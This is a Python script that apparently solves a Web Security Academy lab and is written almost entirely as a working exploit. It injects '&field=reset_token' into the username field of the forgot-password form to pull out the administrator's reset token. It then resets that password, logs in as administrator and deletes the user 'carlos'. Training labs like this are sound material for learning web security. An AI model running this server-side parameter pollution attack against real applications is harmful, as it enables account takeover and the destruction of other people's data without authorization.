# usage:
# python3 4.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import http.client
import json
import re
from argparse import ArgumentParser

import requests

http.client.HTTPConnection.debuglevel = 1


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        self.s = requests.Session()
        forgot_password_url = f"{self.url}/forgot-password"
        r = self.s.get(forgot_password_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            forgot_password_url, data={"csrf": csrf, "username": "administrator"}
        )
        r = self.s.post(
            forgot_password_url,
            data={"csrf": csrf, "username": "administrator&field=reset_token"},
        )
        json_response = json.loads(r.text)
        reset_token = json_response["result"]
        r = self.s.get(f"{self.url}/forgot-password?reset_token={reset_token}")
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            f"{self.url}/forgot-password?reset_token={reset_token}",
            data={
                "csrf": csrf,
                "reset_token": reset_token,
                "new-password-1": "password",
                "new-password-2": "password",
            },
        )
        self.login("administrator", "password")
        self.s.get(f"{self.url}/admin/delete?username=carlos")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
